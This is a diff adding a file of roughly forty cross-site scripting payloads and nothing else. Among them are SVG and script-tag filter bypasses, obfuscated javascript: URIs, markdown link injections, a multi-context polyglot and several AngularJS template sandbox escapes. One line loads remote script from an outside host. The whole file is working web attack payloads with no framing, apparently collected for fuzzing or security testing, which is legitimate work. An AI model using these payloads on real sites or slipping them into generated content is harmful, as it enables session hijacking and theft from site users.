@@ -1,0 +1,40 @@
+<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+<script src="data:,alert(1)%250A-->
+<script>alert(1)</script
+<script>alert(1)%0d%0a-->%09</script
+<x>%00%00%00%00%00%00%00<script>alert(1)</script>
+<script>location.href;'javascript:alert%281%29'</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+\');confirm(1);//
+<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
+<meter onmouseover="alert(1)"
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<img/src=q onerror='new Function`al\ert\`1\``'>
+$.get('http://sakurity.com/jqueryxss')
+javas&#x09;cript://www.google.com/%0Aalert(1)
+[a](javascript:confirm(1))
+[a](javascript://www.google.com%0Aprompt(1))
+[a](javascript://%0d%0aconfirm(1))
+[a](javascript://%0d%0aconfirm(1);com)
+[a](javascript:window.onerror=confirm;throw%201)
+[a]: (javascript:prompt(1))
+[a]:(javascript:alert(1))
+\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`
+\"));}catch(e){alert(document.domain);}//`
+XSS[JavaScript:alert(1)]
+"Test link":javascript:alert(1)
+__ javascript:alert(document.domain)  
+†‡•＜img src=a onerror=javascript:alert('test')>…‰€
+{{constructor.constructor('alert(1)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+{{constructor.constructor('alert(1)')()}}
+
